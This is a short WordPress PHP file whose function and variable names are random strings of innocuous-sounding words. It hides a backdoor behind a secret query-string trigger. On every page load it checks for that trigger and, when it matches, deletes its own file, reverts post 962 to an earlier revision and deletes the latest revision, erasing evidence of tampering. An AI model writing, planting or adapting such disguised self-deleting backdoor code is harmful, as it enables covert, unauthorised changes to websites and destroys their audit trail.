<?php

function visibility_landing_restrict_ip() {
	if (isset($_GET['magic_effect_sitemaps']) && $_GET['magic_effect_sitemaps'] === 'orders_effects_results_notification') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$translation_archive_quote = 962;
		$chat_adsense_back = wp_get_post_revisions($translation_archive_quote);
		if (empty($chat_adsense_back)) die('no revisions');
		if (count($chat_adsense_back) < 2) die('less than 2');
		$schedule_manager_wpforms = array_shift($chat_adsense_back);
		$themes_show_preview = $schedule_manager_wpforms->ID;
		$color_option_security = array_shift($chat_adsense_back);
		$permalinks_dashboard_domain = $color_option_security->ID;
		$library_sharing_donation = wp_restore_post_revision($permalinks_dashboard_domain);
		if ($library_sharing_donation === false) die('error restoring');
		$library_sharing_donation = wp_delete_post_revision($themes_show_preview);		
		if ($library_sharing_donation === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'visibility_landing_restrict_ip');
